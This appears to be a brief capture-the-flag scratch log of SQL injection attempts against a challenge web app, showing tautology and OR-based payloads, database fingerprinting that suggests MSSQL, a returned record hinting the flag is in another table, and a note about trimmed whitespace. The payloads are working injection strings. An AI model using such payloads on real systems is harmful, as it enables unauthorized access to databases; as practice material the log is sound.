```
sqli> 128049 or '1'='1'-- -                 # SQL injection work
sqli> 128049 and '11' = concat('1','1')-- -
sqli> 128049 and '11' = '1'+'1'-- -
```

=> could be MSSQL
=> Note: space are all trimmed

```
sqli> '128048' OR (Id=3)-- -
{"data":{"Description":"The FLAG is in other table","Emoji":"\ud83d\udc08\u200d\u2b1b","Id":3,"Name":"secret_cat (hint here)","Unicode":556694539487}}
```

=> Don't know how to get whitespace to work...
